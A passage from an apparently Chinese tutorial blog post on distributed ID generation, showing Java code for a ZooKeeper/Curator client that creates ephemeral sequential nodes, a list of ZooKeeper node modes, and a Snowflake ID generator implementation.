                <span class="token punctuation">.</span><span class="token function">sessionTimeoutMs</span><span class="token punctuation">(</span>zookeeperProperties<span class="token punctuation">.</span><span class="token function">getSessionTimeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">connectionTimeoutMs</span><span class="token punctuation">(</span>zookeeperProperties<span class="token punctuation">.</span><span class="token function">getConnectionTimeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">retryPolicy</span><span class="token punctuation">(</span>policy<span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//启动实例</span>
        curatorFrameworkClient<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> curatorFrameworkClient<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span>destroyMethod <span class="token operator">=</span> <span class="token string">"destroy"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">ZookeeperClient</span> <span class="token function">zookeeperClient</span><span class="token punctuation">(</span><span class="token class-name">ZookeeperProperties</span> zookeeperProperties<span class="token punctuation">,</span> <span class="token class-name">CuratorFramework</span> curatorFrameworkClient<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ZookeeperClient</span><span class="token punctuation">(</span>zookeeperProperties<span class="token punctuation">,</span> curatorFrameworkClient<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<h2>
<a id="_234"></a>四、详细使用</h2> 
<h3>
<a id="41zookeeperClientfont_colorFF0000font__235"></a>4.1、zookeeperClient（<font color="#FF0000">核心</font>）</h3> 
<p>  此组件主要是完成，顺序节点的创建，我这里创建的是临时顺利节点。我想我代码的注释比这个惨白的文字要更有说服力。很多小伙伴可能会采用<font color="#FF0000">@Component</font>注解，我使用<font color="#FF0000">@Bean(destroyMethod = “destroy”)</font>来创建，可以比较优雅的关闭连接，当然在使用上是一样的，只要不是对一个bean同时使用<font color="#FF0000">@Component </font>和<font color="#FF0000"> @Bean</font>。<br> <strong>zookeeperClient.java</strong></p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>common</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">ZookeeperProperties</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>istack<span class="token punctuation">.</span>internal<span class="token punctuation">.</span></span><span class="token class-name">NotNull</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>curator<span class="token punctuation">.</span>framework<span class="token punctuation">.</span></span><span class="token class-name">CuratorFramework</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>zookeeper<span class="token punctuation">.</span></span><span class="token class-name">CreateMode</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>zookeeper<span class="token punctuation">.</span>data<span class="token punctuation">.</span></span><span class="token class-name">Stat</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collections</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Slf4j</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ZookeeperClient</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">private</span> <span class="token class-name">ZookeeperProperties</span> zookeeperProperties<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">CuratorFramework</span> curatorFramework<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">CuratorFramework</span> <span class="token function">getCuratorFramework</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> curatorFramework<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">ZookeeperClient</span><span class="token punctuation">(</span><span class="token class-name">ZookeeperProperties</span> zookeeperProperties<span class="token punctuation">,</span> <span class="token class-name">CuratorFramework</span> curatorFramework<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>zookeeperProperties <span class="token operator">=</span> zookeeperProperties<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>curatorFramework <span class="token operator">=</span> curatorFramework<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"ZookeeperClient销毁方法，如果zookeeper连接不为空，则关闭连接"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getCuratorFramework</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token comment">//这种方式比较优雅的关闭连接</span>
                <span class="token function">getCuratorFramework</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"stop zookeeper client error {}"</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 分布式ID生成
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">generateId</span><span class="token punctuation">(</span><span class="token class-name">String</span> nodeName<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">//创建临时自动编号的顺序节点,返回的是一个路径</span>
        <span class="token class-name">String</span> nodeFullPath <span class="token operator">=</span> <span class="token function">createSeqNode</span><span class="token punctuation">(</span>nodeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">==</span> nodeFullPath<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">String</span> generateId <span class="token operator">=</span> <span class="token function">splitSeqNode</span><span class="token punctuation">(</span>nodeFullPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"节点编号："</span> <span class="token operator">+</span> generateId<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> generateId<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 创建顺序节点,约定nodePrefix不能为空，也不能用"/"开头或结尾
     */</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">createSeqNode</span><span class="token punctuation">(</span><span class="token annotation punctuation">@NotNull</span> <span class="token class-name">String</span> nodePrefix<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>nodePrefix<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> nodePrefix<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> nodePrefix<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"节点前缀错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">String</span> nodeFullPath <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token comment">//根路径+要创建节点的名称（可以是路径，此处传入的nodeName不要用"/"开头或结尾）</span>
        <span class="token class-name">String</span> fullPath <span class="token operator">=</span> zookeeperProperties<span class="token punctuation">.</span><span class="token function">getRootPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>nodePrefix<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
            <span class="token comment">//关键点：创建临时顺序节点</span>
            <span class="token comment">//creatingParentsIfNeeded():如果传入的是路径，并且节点父路径不存在则创建父节点</span>
            nodeFullPath <span class="token operator">=</span> curatorFramework
                    <span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    <span class="token punctuation">.</span><span class="token function">creatingParentsIfNeeded</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    <span class="token punctuation">.</span><span class="token function">withMode</span><span class="token punctuation">(</span><span class="token class-name">CreateMode</span><span class="token punctuation">.</span>EPHEMERAL_SEQUENTIAL<span class="token punctuation">)</span>
                    <span class="token punctuation">.</span><span class="token function">forPath</span><span class="token punctuation">(</span>fullPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"创建临时顺序节点异常{}"</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> nodeFullPath<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">splitSeqNode</span><span class="token punctuation">(</span><span class="token class-name">String</span> path<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">//获取最后一个"/"的索引，用于字符串截取</span>
        <span class="token keyword">int</span> index <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token comment">//如果"/"位置比路径长度小，则截取"/"后面的作为节点返回</span>
            <span class="token comment">//如果"/"位置等于路径长度，说明它后面没有元素，返回空字符串</span>
            <span class="token keyword">return</span> index <span class="token operator">&lt;=</span> path<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">//不含"/"，说明是节点数据，直接返回（理论上不会，因为都是"/"开头的路径，至少有一个"/"）</span>
        <span class="token keyword">return</span> path<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

	<span class="token comment">//删除节点</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deleteTheNode</span><span class="token punctuation">(</span><span class="token class-name">String</span> fullNodePath<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
            <span class="token class-name">Stat</span> stat <span class="token operator">=</span> curatorFramework<span class="token punctuation">.</span><span class="token function">checkExists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forPath</span><span class="token punctuation">(</span>fullNodePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>stat <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                curatorFramework<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forPath</span><span class="token punctuation">(</span>fullNodePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 根据路径获取子节点
     * path  以 / 开头不能以 / 结尾
     *
     * @param path
     * @return
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token class-name">String</span> path<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> childrenList <span class="token operator">=</span> curatorFramework<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forPath</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>childrenList <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> childrenList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> childrenList<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">emptyList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>关于zookeeper里节点的模式，新版又增加了两个带TTL的持久化节点，节点模式：</p> 
<ul>
<li>
<font color="#FF0000">PERSISTENT</font>：持久化节点</li>
<li>
<font color="#FF0000">PERSISTENT_SEQUENTIAL</font>：持久化的顺序自动编号节点</li>
<li>
<font color="#FF0000">EPHEMERAL</font>：临时节点</li>
<li>
<font color="#FF0000">EPHEMERAL_SEQUENTIAL</font>：临时顺序自动编号节点</li>
<li>
<font color="#FF0000">CONTAINER</font>：容器节点</li>
<li>
<font color="#FF0000">PERSISTENT_WITH_TTL</font>：带TTL（time-to-live，存活时间）的持久化节点，节点在TTL时间之内没有得到更新并且没有子节点，就会被自动删除</li>
<li>
<font color="#FF0000">PERSISTENT_SEQUENTIAL_WITH_TTL</font>：带TTL（time-to-live，存活时间）和单调递增序号的持久节点，节点在TTL时间之内没有得到更新并且没有子节点，就会被自动删除</li>
</ul> 
<h3>
<a id="42Snowflakefont_colorFF0000font__374"></a>4.2、Snowflake算法（<font color="#FF0000">核心</font>）</h3> 
<p>  要了解snowflake算法，首先得了解它的结构</p> 
<p><img src="https://images2.imgbox.com/67/8a/uKDUIcMC_o.png" alt="在这里插入图片描述"></p> 
<ul>
<li>第一位：占用1bit，其值始终是0，没有实际作用</li>
<li>时间戳：占用41bit，精确到毫秒，总共可以容纳约69年的时间（<font color="#FF0000">(1L &lt;&lt; 41) / (1000L * 60 * 60 * 24 * 365) = 69</font>）</li>
<li>工作机器id：占用10bit，最多可以容纳1024个节点（<font color="#FF0000">可以改造为5位工作中心+5位数据中心，具体如上图第二部分</font>）</li>
<li>序列号：占用12bit，最多可以累加到4095。这个值在同一毫秒同一节点上从0开始不断累加。</li>
</ul> 
<p>Snowflake算法是开源的如下：</p> 
<p><strong>Snowflake.java</strong></p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>common</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * Twitter_Snowflake&lt;br&gt;
 * SnowFlake的结构如下(每部分用-分开):&lt;br&gt;
 * 0 - 0000000000 0000000000 0000000000 0000000000 0 - 00000 - 00000 - 000000000000 &lt;br&gt;
 * 1位标识，由于long基本类型在Java中是带符号的，最高位是符号位，正数是0，负数是1，所以id一般是正数，最高位是0&lt;br&gt;
 * 41位时间截(毫秒级)，注意，41位时间截不是存储当前时间的时间截，而是存储时间截的差值（当前时间截 - 开始时间截)
 * 得到的值），这里的的开始时间截，一般是我们的id生成器开始使用的时间，由我们程序来指定的（如下下面程序IdWorker类的startTime属性）。41位的时间截，可以使用69年，年T = (1L &lt;&lt; 41) / (1000L * 60 * 60 * 24 * 365) = 69&lt;br&gt;
 * 10位的数据机器位，可以部署在1024个节点，包括5位datacenterId和5位workerId&lt;br&gt;
 * 12位序列，毫秒内的计数，12位的计数顺序号支持每个节点每毫秒(同一机器，同一时间截)产生4096个ID序号&lt;br&gt;
 * 加起来刚好64位，为一个Long型。&lt;br&gt;
 * SnowFlake的优点是，整体上按照时间自增排序，并且整个分布式系统内不会产生ID碰撞(由数据中心ID和机器ID作区分)，并且效率较高，经测试，SnowFlake每秒能够产生26万ID左右。
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Snowflake</span> <span class="token punctuation">{<!-- --></span>

    <span class="token comment">/**
     * 基本变量
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">long</span> startTimestamp <span class="token operator">=</span> <span class="token number">1636560000000L</span><span class="token punctuation">;</span><span class="token comment">//开始时间截 (2021-11-11)</span>
    <span class="token keyword">private</span> <span class="token keyword">long</span> dataCenterId<span class="token punctuation">;</span><span class="token comment">//数据中心ID(0~31)</span>
    <span class="token keyword">private</span> <span class="token keyword">long</span> workerId<span class="token punctuation">;</span><span class="token comment">//工作机器ID(0~31)</span>
    <span class="token keyword">private</span> <span class="token keyword">long</span> sequence <span class="token operator">=</span> <span class="token number">0L</span><span class="token punctuation">;</span><span class="token comment">//毫秒内序列(0~4095)</span>
    <span class="token keyword">private</span> <span class="token keyword">long</span> lastTimestamp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1L</span><span class="token punctuation">;</span><span class="token comment">//上次生成ID的时间截</span>

    <span class="token comment">/**
     * 每一部分占用的位数
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">long</span> dataCenterIdBits <span class="token operator">=</span> <span class="token number">5L</span><span class="token punctuation">;</span><span class="token comment">//数据标识id所占的位数</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">long</span> workerIdBits <span class="token operator">=</span> <span class="token number">5L</span><span class="token punctuation">;</span><span class="token comment">//机器id所占的位数</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">long</span> sequenceBits <span class="token operator">=</span> <span class="token number">12L</span><span class="token punctuation">;</span><span class="token comment">//序列在id中占的位数</span>

    <span class="token comment">/**
     * 每一部分最大值
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">long</span> maxDataCenterId <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1L</span> <span class="token operator">&lt;&lt;</span> dataCenterIdBits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//支持的最大数据标识id，结果是31</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">long</span> maxWorkerId <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1L</span> <span class="token operator">&lt;&lt;</span> workerIdBits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//支持的最大机器id，结果是31</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">long</span> sequenceMask <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1L</span> <span class="token operator">&lt;&lt;</span> sequenceBits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//生成序列的掩码，这里为4095</span>

    <span class="token comment">/**
     * 每一部分向左的位移
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">long</span> timestampLeftShift <span class="token operator">=</span> sequenceBits <span class="token operator">+</span> workerIdBits <span class="token operator">+</span> dataCenterIdBits<span class="token punctuation">;</span><span class="token comment">//时间截向左移22位(5+5+12)</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">long</span> dataCenterIdShift <span class="token operator">=</span> sequenceBits <span class="token operator">+</span> workerIdBits<span class="token punctuation">;</span><span class="token comment">//数据标识id向左移17位(12+5)</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">long</span> workerIdShift <span class="token operator">=</span> sequenceBits<span class="token punctuation">;</span><span class="token comment">//机器ID向左移12位</span>

    <span class="token comment">/**
     * 构造函数
     *
     * @param dataCenterId 数据中心ID (0~31)
     * @param workerId     工作ID (0~31)
     */</span>
    <span class="token keyword">public</span> <span class="token class-name">Snowflake</span><span class="token punctuation">(</span><span class="token keyword">long</span> dataCenterId<span class="token punctuation">,</span> <span class="token keyword">long</span> workerId<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>dataCenterId <span class="token operator">&gt;</span> maxDataCenterId <span class="token operator">||</span> dataCenterId <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"datacenter Id can't be greater than %d or less than 0"</span><span class="token punctuation">,</span> maxDataCenterId<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>workerId <span class="token operator">&gt;</span> maxWorkerId <span class="token operator">||</span> workerId <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"worker Id can't be greater than %d or less than 0"</span><span class="token punctuation">,</span> maxWorkerId<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>workerId <span class="token operator">=</span> workerId<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>dataCenterId <span class="token operator">=</span> dataCenterId<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 获得下一个ID (该方法是线程安全的)
     *
     * @return SnowflakeId
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">long</span> <span class="token function">nextId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">long</span> timestamp <span class="token operator">=</span> <span class="token function">timeGen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//如果当前时间小于上一次ID生成的时间戳，说明系统时钟回退过这个时候应当抛出异常</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>timestamp <span class="token operator">&lt;</span> lastTimestamp<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>
                    <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Clock moved backwards.  Refusing to generate id for %d milliseconds"</span><span class="token punctuation">,</span> lastTimestamp <span class="token operator">-</span> timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">//如果是同一时间生成的，则进行毫秒内序列</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>lastTimestamp <span class="token operator">==</span> timestamp<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            sequence <span class="token operator">=</span> <span class="token punctuation">(</span>sequence <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> sequenceMask<span class="token punctuation">;</span>
            <span class="token comment">//毫秒内序列溢出</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>sequence <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token comment">//阻塞到下一个毫秒,获得新的时间戳</span>
                timestamp <span class="token operator">=</span> <span class="token function">tilNextMillis</span><span class="token punctuation">(</span>lastTimestamp<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token comment">//时间戳改变，毫秒内序列重置</span>
        <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            sequence <span class="token operator">=</span> <span class="token number">0L</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">//上次生成ID的时间截</span>
        lastTimestamp <span class="token operator">=</span> timestamp<span class="token punctuation">;</span>
        <span class="token comment">//移位并通过或运算拼到一起组成64位的ID</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>timestamp <span class="token operator">-</span> startTimestamp<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> timestampLeftShift<span class="token punctuation">)</span> <span class="token comment">//</span>
                <span class="token operator">|</span> <span class="token punctuation">(</span>dataCenterId <span class="token operator">&lt;&lt;</span> dataCenterIdShift<span class="token punctuation">)</span> <span class="token comment">//</span>
                <span class="token operator">|</span> <span class="token punctuation">(</span>workerId <span class="token operator">&lt;&lt;</span> workerIdShift<span class="token punctuation">)</span> <span class="token comment">//</span>
                <span class="token operator">|</span> sequence<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 阻塞到下一个毫秒，直到获得新的时间戳
     *
     * @param lastTimestamp 上次生成ID的时间截
     * @return 当前时间戳
     */</span>
    <span class="token keyword">protected</span> <span class="token keyword">long</span> <span class="token function">tilNextMillis</span><span class="token punctuation">(</span><span class="token keyword">long</span> lastTimestamp<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
